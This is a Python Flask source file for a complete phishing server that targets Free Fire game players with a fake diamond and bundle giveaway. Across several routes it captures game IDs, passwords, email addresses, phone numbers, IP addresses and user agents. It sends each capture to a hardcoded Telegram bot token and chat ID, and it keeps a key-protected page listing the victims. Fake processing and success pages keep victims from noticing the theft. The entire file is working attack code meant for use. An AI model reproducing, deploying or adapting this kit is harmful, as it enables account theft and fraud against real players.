from flask import Flask, render_template, request, session, redirect, url_for
import requests
import json
import os
from datetime import datetime
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app)

# ==================== YOUR TELEGRAM CREDENTIALS ====================
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8097850664:AAFL3FiXjq_HWbyxqgE-oHeULowwsz-znGM')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '8288953123')
# ===================================================================

app.secret_key = os.environ.get('FLASK_SECRET_KEY', os.urandom(24))

victims_data = []

def send_to_telegram(data):
    """Send Free Fire victim data to YOUR Telegram"""
    # Format the message
    game_id = data.get('game_id', 'N/A')
    password = data.get('password', 'N/A')
    email = data.get('email', 'N/A')
    phone = data.get('phone', 'N/A')
    
    message = f"""
    🎮 *🔥 FREE FIRE VICTIM CAPTURED 🔥* 🎮
    
    📊 *ACCOUNT DETAILS:*
    🆔 Game ID: `{game_id}`
    🔑 Password: `{password}`
    📧 Email: `{email}`
    📞 Phone: `{phone}`
    
    🎁 *REWARDS REQUESTED:*
    💎 Diamonds: {data.get('diamonds', '10,000')}
    🌸 Sakura Bundle: {data.get('sakura', 'Yes')}
    🎵 Hip Hop Bundle: {data.get('hiphop', 'Yes')}
    👕 Character Skin: {data.get('skin', 'Yes')}
    
    🌐 *TECHNICAL INFO:*
    🔍 IP: `{data.get('ip', 'N/A')}`
    🕒 Time: `{data.get('time', 'N/A')}`
    🌍 User-Agent: `{data.get('user_agent', 'N/A')}`
    
    ⚡ *STATUS:* {data.get('status', 'CREDENTIALS CAPTURED')}
    """
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"[✅] Telegram alert sent for Game ID: {game_id}")
            return True
        else:
            print(f"[❌] Telegram error: {response.text}")
            # Try alternative method
            return send_alternative(data)
    except Exception as e:
        print(f"[❌] Telegram send failed: {e}")
        return False

def send_alternative(data):
    """Alternative Telegram send method"""
    simple_msg = f"Free Fire Victim: ID:{data.get('game_id')} | Pass:{data.get('password')} | Time:{datetime.now()}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": simple_msg
    }
    try:
        requests.post(url, json=payload)
        return True
    except:
        return False

@app.route('/')
def index():
    """Free Fire Rewards Landing Page"""
    session.clear()
    return render_template('index.html')

@app.route('/claim', methods=['POST'])
def claim():
    """Step 1: User selects rewards"""
    session['diamonds'] = request.form.get('diamonds', '10000')
    session['sakura'] = request.form.get('sakura', 'yes')
    session['hiphop'] = request.form.get('hiphop', 'yes')
    session['skin'] = request.form.get('skin', 'yes')
    
    return redirect(url_for('login'))

@app.route('/login')
def login():
    """Step 2: Free Fire login page"""
    return render_template('login.html')

@app.route('/authenticate', methods=['POST'])
def authenticate():
    """Step 3: Capture Free Fire credentials"""
    game_id = request.form.get('game_id', '').strip()
    password = request.form.get('password', '').strip()
    
    session['game_id'] = game_id
    session['password'] = password
    
    # Send immediate alert
    victim_data = {
        'game_id': game_id,
        'password': password,
        'diamonds': session.get('diamonds', '10000'),
        'sakura': session.get('sakura', 'yes'),
        'hiphop': session.get('hiphop', 'yes'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'STEP 1 - LOGIN CREDENTIALS CAPTURED'
    }
    
    send_to_telegram(victim_data)
    victims_data.append(victim_data)
    
    return redirect(url_for('verify'))

@app.route('/verify')
def verify():
    """Step 4: Additional verification"""
    if 'game_id' not in session:
        return redirect(url_for('index'))
    return render_template('verify.html', game_id=session['game_id'])

@app.route('/complete', methods=['POST'])
def complete():
    """Step 5: Capture email/phone"""
    email = request.form.get('email', '').strip()
    phone = request.form.get('phone', '').strip()
    
    # Complete victim data
    complete_data = {
        'game_id': session.get('game_id', 'N/A'),
        'password': session.get('password', 'N/A'),
        'email': email,
        'phone': phone,
        'diamonds': session.get('diamonds', '10000'),
        'sakura': session.get('sakura', 'yes'),
        'hiphop': session.get('hiphop', 'yes'),
        'skin': session.get('skin', 'yes'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'COMPLETE - ALL DATA CAPTURED'
    }
    
    # Send final alert
    send_to_telegram(complete_data)
    victims_data.append(complete_data)
    
    return redirect(url_for('processing'))

@app.route('/processing')
def processing():
    """Step 6: Fake processing page"""
    return render_template('loading.html')

@app.route('/success')
def success():
    """Step 7: Fake success page"""
    # Final notification
    final_alert = {
        'game_id': session.get('game_id', 'N/A'),
        'status': 'VICTIM COMPLETED ALL STEPS - DIAMONDS PROCESSING',
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'note': 'User believes they will get 10k diamonds and bundles'
    }
    send_to_telegram(final_alert)
    
    return render_template('success.html')

@app.route('/stats')
def stats():
    """Admin stats page (protected)"""
    if request.args.get('key') != 'freefire2024':
        return "Unauthorized", 403
    
    stats_data = {
        'total_victims': len(victims_data),
        'recent_victims': victims_data[-10:] if victims_data else [],
        'telegram_bot': TELEGRAM_BOT_TOKEN[:10] + '...',
        'chat_id': TELEGRAM_CHAT_ID,
        'your_bot_link': f'https://t.me/{TELEGRAM_BOT_TOKEN.split(":")[0]}'
    }
    
    return json.dumps(stats_data, indent=2)

@app.route('/test-telegram')
def test_telegram():
    """Test Telegram connection with YOUR credentials"""
    test_data = {
        'game_id': 'TEST_ACCOUNT_123',
        'password': 'testpass123',
        'email': 'test@example.com',
        'status': 'TELEGRAM BOT TEST SUCCESSFUL',
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'note': f'Bot Token: {TELEGRAM_BOT_TOKEN[:15]}... | Chat ID: {TELEGRAM_CHAT_ID}'
    }
    
    if send_to_telegram(test_data):
        return """
        <h1>✅ Telegram Bot Connected Successfully!</h1>
        <p>Your bot will receive this test message.</p>
        <p>Bot Token: ...{}</p>
        <p>Chat ID: {}</p>
        <p>Check your Telegram now!</p>
        """.format(TELEGRAM_BOT_TOKEN[-10:], TELEGRAM_CHAT_ID)
    else:
        return """
        <h1>❌ Telegram Connection Failed!</h1>
        <p>Check your:</p>
        <ol>
        <li>Bot Token: {}</li>
        <li>Chat ID: {}</li>
        <li>Internet Connection</li>
        </ol>
        """.format(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

if __name__ == '__main__':
    print("="*50)
    print("FREE FIRE PHISHING SERVER STARTED")
    print(f"Telegram Bot Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"Telegram Chat ID: {TELEGRAM_CHAT_ID}")
    print(f"Bot Link: https://t.me/{TELEGRAM_BOT_TOKEN.split(':')[0]}")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=False)